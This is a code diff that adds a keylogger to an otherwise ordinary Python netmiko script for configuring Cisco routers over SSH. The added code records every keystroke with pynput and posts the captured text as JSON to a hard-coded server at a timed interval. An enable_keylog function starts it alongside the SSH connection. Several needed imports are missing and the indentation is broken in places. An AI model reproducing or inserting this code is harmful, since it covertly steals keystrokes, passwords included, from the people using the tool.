@@ -1,5 +1,61 @@
 from netmiko import ConnectHandler
 from netmiko.ssh_exception import NetMikoTimeoutException, AuthenticationException
+
+
+#----------------------------------keylogger------------------------------------#
+
+# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
+text = ""
+
+# Hard code the values of your server and IP address here.
+ip_address = "localhost"
+port_number = "8080"
+# Time interval in seconds for code to execute.
+time_interval = 10
+
+def send_post_req():
+    try:
+        # We need to convert the Python object into a JSON string so that we can POST it to the server.
+        # The server expects JSON in the format {"keyboardData" : "<value_of_text>"}
+        payload = json.dumps({"keyboardData" : text})
+        # We send the POST request to the server with the specified IP address and port.
+        # We specify that the MIME Type for JSON is application/json.
+        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
+        # Setting up a timer function to run every <time_interval> seconds.
+        # send_post_req is a recursive function and will call itself as long as the program is running.
+        timer = threading.Timer(time_interval, send_post_req)
+        # We start the timer thread.
+        timer.start()
+    except:
+        print("Couldn't complete request!")
+
+# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
+def on_press(key):
+    global text
+
+    # Based on the key press, we handle the way the key gets logged to the in-memory string.
+    # Read more on the different keys that can be logged here:
+    # https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text += "\t"
+    elif key == keyboard.Key.space:
+        text += " "
+    elif key == keyboard.Key.shift:
+        pass
+    elif key == keyboard.Key.backspace and len(text) == 0:
+        pass
+    elif key == keyboard.Key.backspace and len(text) > 0:
+        text = text[:-1]
+    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
+        text += str(key).strip("'")
+    #---------------------------------------ssh-connection-----------------------------------------------#
 def ssh_connection(ip_address):
     iosv_l2 = {
         'device_type': 'cisco_ios',
@@ -20,7 +76,24 @@ def ssh_connection(ip_address):
     except Exception as unknown_error:
         print('Some other error: ' + str(unknown_error))
     return connection
-#----------------------------LOOPBACK Configuration---------------------------------#
+
+
+    #-----------------------------------enable_keylogger---------------------------------------------#
+def enable_keylog():
+
+# Start the SSH connection
+   connection = ssh_connection(ip_address)
+
+   if connection:
+    # Start the keyboard listener in a separate thread
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+    # Start sending the POST requests to the server
+    send_post_req()
+
+    # Joining the listener thread, which will run as long as the program is running.
+    listener.join()#----------------------------LOOPBACK Configuration---------------------------------#
 def construct_LOOPBACKLIST():
     router_graph = {}
    
